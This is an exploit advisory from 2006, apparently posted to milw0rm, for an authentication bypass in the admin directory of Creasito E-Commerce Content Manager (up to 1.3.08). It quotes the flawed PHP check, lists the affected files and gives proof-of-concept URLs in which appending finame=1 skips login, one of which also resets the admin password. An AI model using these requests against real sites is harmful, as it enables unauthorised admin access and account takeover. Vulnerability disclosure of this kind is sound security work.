@@ -1,0 +1,58 @@
+                                             
+============================================================================================
+
+Creasito E-Commerce Content Manager (admin) Authentication Bypass
+
+============================================================================================
+
+Product............: Creasito E-Commerce Content Manager
+Affected versions..: Creasito <= 1.3.08
+Security Risk......: High
+Vendor.............: G. Fabozzi (http://creasito.bloghosteria.com/)
+Product Link.......: http://prdownloads.sourceforge.net/creasito/creasito1.3.08.zip?download
+Discovered by......: SlimTim10
+
+
+Details:
+---------
+Files in the /admin directory use a very poor security method for authentication that is
+simple to bypass.
+
+Vulnerable Code:
+-----------------
+if ( empty( $finame ) ) {
+?> Prego effettuare il login <a href="index.php"> Qui<br>
+&copy;Bloghosteria.com<br>
+</a>
+
+Vulnerable Files:
+------------------
+(in /admin)
+addnewcont.php, adminpassw.php, amministrazione.php, artins.php, bgcolor.php,
+cancartcat.php, canccat.php, cancelart.php, cancontsit.php, chanpassamm.php, dele.php,
+delecat.php, delecont.php, emailall.php, gestflashtempl.php, gestmagart.php, gestmagaz.php,
+gestpre.php, input.php, input3.php, insnucat.php, instempflash.php, mailfc.php,
+modfdati.php, rescont4.php, ricordo1.php, ricordo4.php, tabcatalg.php, tabcont.php,
+tabcont3.php, tabstile.php, tabstile3.php, testimmg.php, update.php
+
+Proof of Concept:
+------------------
+
+http://[host]/admin/amministrazione.php?finame=1
+http://[host]/admin/admin/dele.php?finame=1
+http://[host]/admin/chanpassamm.php?finame=1&password=testing&passver=testing *
+* Changes the password as well as bypassing authentication
+
+
+Solution:
+----------
+Use a better authentication method, like cookies!
+
+================================================================
+
+Shoutz: PCD, dw0rek, Tainted, str0ke!
+SlimTim10 <slimtim10[at]gmail[dot]com>
+
+================================================================
+
+# milw0rm.com [2006-11-03]
